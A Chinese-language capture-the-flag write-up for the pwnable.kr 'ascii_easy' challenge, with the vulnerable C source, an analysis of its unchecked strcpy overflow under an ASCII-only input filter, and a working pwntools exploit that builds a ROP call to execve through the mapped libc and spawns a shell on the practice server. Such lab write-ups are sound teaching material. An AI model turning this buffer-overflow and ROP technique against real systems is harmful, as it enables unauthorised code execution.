---
title: kr_ascii_easy
date: 2020-02-10 20:36:52
tags:
- pwn
- pwnable.kr
---

# pwnable.kr ascii_easy

### 0x1 分析

看一下安全性：

<img src="https://i.loli.net/2020/02/10/BFuAyZd51CKmsYH.png" style="zoom:50%;" />

可操作性挺强的（看起来）。还给了libc-2.15.so文件。

看一下源码：

```c
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define BASE ((void*)0x5555e000)

int is_ascii(int c){
    if(c>=0x20 && c<=0x7f) return 1;
    return 0;
}

void vuln(char* p){
    char buf[20];
    strcpy(buf, p);
}

void main(int argc, char* argv[]){

    if(argc!=2){
        printf("usage: ascii_easy [ascii input]\n");
        return;
    }

    size_t len_file;
    struct stat st;
    int fd = open("/home/ascii_easy/libc-2.15.so", O_RDONLY);
    if( fstat(fd,&st) < 0){
        printf("open error. tell admin!\n");
        return;
    }

    len_file = st.st_size;
    if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){
        printf("mmap error!. tell admin\n");
        return;
    }

    int i;
    for(i=0; i<strlen(argv[1]); i++){
        if( !is_ascii(argv[1][i]) ){
            printf("you have non-ascii byte!\n");
            return;
        }
    }

    printf("triggering bug...\n");
    vuln(argv[1]);

}
```

首先程序需要一个参数。要求是通过`is_ascii`函数的检测。每个字符要在`0x20-0x7f`之间。这样其实限制了太多。

看到在`vuln()`函数里有溢出点`strcpy(buf, p);`，这里并没有长度要求。而且没有CANARY的保护。接下来要考虑怎么构造ROP。

然而由于`is_ascii`的范围限制。one_gadget找到的gadget都不能用。

实在不想构造一个很长的ROP链（懒。）最后找到一个师傅的[write up](https://chp747.tistory.com/291)。他用了一个很巧妙的办法来完成。

首先，他设置了`/bin/sh` 到 `error`的软链：`ln -s /bin/sh error`。

接着构造一个`payload`，来构造执行函数`execve("error", NULL, NULL);`

查找`NULL`：`objdump -d libc-2.15.so | grep "00 00 00 00"`

查找`"error"`：`objdump  -d libc-2.15.so -j .rodata | grep "error" `

完成。

### 0x2 EXP

```python
#!/usr/bin/python
from pwn import *

#gets = 0x555c3e30
#buf = 0x556d5555
call_execve = 0x5561676a
error = 0x556b7c56
null = 0x556f7640

_argv = 'A'*0x20
_argv += p32(call_execve)
_argv += p32(error)
_argv += p32(null)
_argv += p32(null)

s = ssh(host='pwnable.kr', user='ascii_easy', password='guest', port=2222)
r = s.process(['./ascii_easy', _argv])
r.interactive()
```

